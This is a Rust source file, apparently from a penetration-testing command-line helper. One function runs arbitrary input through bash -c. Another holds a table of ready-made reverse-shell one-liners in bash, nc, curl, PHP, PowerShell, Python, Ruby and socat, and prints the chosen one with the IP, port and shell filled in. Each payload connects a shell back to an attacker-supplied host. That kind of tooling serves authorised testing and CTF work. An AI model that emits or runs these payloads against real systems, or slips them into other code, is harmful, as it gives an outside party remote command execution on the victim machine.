use serde_json::json;

pub fn spawn_shell(command: String) {
    use std::process::Command;
    let mut parts = command.trim_start().splitn(2, ' ');
    let shell_command = parts.nth(1).unwrap_or("");
    let output = Command::new("bash")
        .arg("-c")
        .arg(shell_command)
        .output()
        .expect("failed to spawn shell");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    if !output.status.success() {
        println!("Command failed with status: {}", output.status);
        println!("{}", stderr);
    } else {
        println!("{}", stdout);
    }
}

pub fn revshell(command: String) {
    let revshells = json!([
        {
            "name": "bash",
            "command": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        },
        {
            "name": "nc",
            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
        },
        {
            "name": "curl",
            "command": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
        },
        {
            "name": "php",
            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
        },
        {
            "name": "powershell",
            "command": "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
        },
        {
            "name": "python",
            "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
        },
        {
            "name": "ruby",
            "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
        },
        {
            "name": "socat",
            "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
        }
    ]);
    let mut parts = command.trim_start().split(' ');
    parts.next();
    let language = parts.next().unwrap_or("").trim();
    let ip = parts.next().unwrap_or("10.10.10.10").trim();
    let port = parts.next().unwrap_or("4444").trim();
    
    let mut found = false;
    for revshell in revshells.as_array().unwrap() {
        if language.contains(revshell["name"].as_str().unwrap()) {
            let command = revshell["command"].as_str().unwrap();
            println!("{}", command.replace("{ip}", ip).replace("{port}", port).replace("{shell}", "sh"));
            found = true;
            break;
        }
    }
    if !found {
        println!("No revshell found for {}! You can add it in src/locals.rs!", language);
    }

}